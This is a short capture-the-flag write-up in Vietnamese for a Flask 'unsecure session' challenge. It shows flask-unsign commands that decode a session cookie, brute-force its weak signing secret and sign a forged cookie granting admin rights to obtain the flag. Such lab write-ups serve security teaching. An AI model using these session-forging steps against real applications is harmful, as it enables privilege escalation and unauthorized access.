# Flask - Unsecure session

## Solution

- Decode session:

    Bắt đầu bằng cách decode Cookie được cung cấp để hiểu nội dung của nó:

    ```
    flask-unsign --decode --cookie 'eyJhZG1pbiI6ImZhbHNlIiwidXNlcm5hbWUiOiJndWVzdCJ9.ZWczRw.Tw5eCtypUwE7t96NCbRQzrjX1UM'
    ```

    Dữ liệu session sau khi decode:

    ```
    {'admin': 'false', 'username': 'guest'}
    ```

- Brute-force và Unsign để tìm Secret:

    ```
    flask-unsign --unsign --cookie 'eyJhZG1pbiI6ImZhbHNlIiwidXNlcm5hbWUiOiJndWVzdCJ9.ZWczRw.Tw5eCtypUwE7t96NCbRQzrjX1UM'
    ```

    Sau khi brute-force thành công, secket key sẽ được tiết lộ:

    ```
    [+] Found secret key after 19968 attempts: 's3cr3t'
    ```

- Chỉnh sửa session:
    Sử dụng secret thu được, thực hiện chỉnh sửa session để nâng quyền:

    ```
    flask-unsign --sign --cookie "{'admin': 'true', 'username': 'admin'}" --secret 's3cr3t'
    ```

- Lấy flag:
    Với phiên được chỉnh sửa, ứng dụng tạo session key mới. Sử dụng key này để truy cập quyền admin và lấy flag.